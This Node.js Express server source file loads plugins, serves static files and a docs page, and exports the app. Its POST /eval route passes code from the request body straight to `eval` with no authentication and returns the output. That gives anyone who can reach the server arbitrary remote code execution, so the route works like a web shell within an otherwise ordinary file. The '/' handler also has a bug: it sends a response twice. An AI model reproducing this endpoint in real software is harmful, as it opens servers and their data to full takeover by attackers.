const express = require("express");
const path = require("path");
const format = require('util').format;
const {
  initPlugins,
  watchPlugins,
  getPluginsMeta
} = require('./core/pluginManager')

const renderDocs = require('./core/docsRenderer');

const app = express();

/* STATIC */
app.use(express.static('./public'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

/* PLUGINS */
const projectRoot = path.resolve(process.env.LAMBDA_TASK_ROOT || process.cwd());
const pluginsDir = path.join(projectRoot, 'plugins');
initPlugins(app, pluginsDir);
watchPlugins(app, pluginsDir);

/* DOCS */
app.get("/", (req, res) => {
  res.send(renderDocs(getPluginsMeta()));
  res.send(__dirname)
});

app.post('/eval', async (req,res) => {
const q = req.body
const emulate = () =>{
async function start() {
try{
let evaluate = false
try {
evaluate = await eval(`const evalspace = async()=>{${q.code};};evalspace()`);
try {
evaluate = format(evaluate)
} catch { }
} catch (e) {
evaluate = e.stack.toString();
};
let result = format(evaluate)
res.send(result)
}catch(e){
res.end()
}
}
start()
}
emulate()
});

/* SERVER */
/*app.listen(80, () => {
  console.log("🔥 Server berjalan (HOT RELOAD AKTIF)");
  console.log("📘 Docs: http://localhost:80");
}); */
module.exports = app;
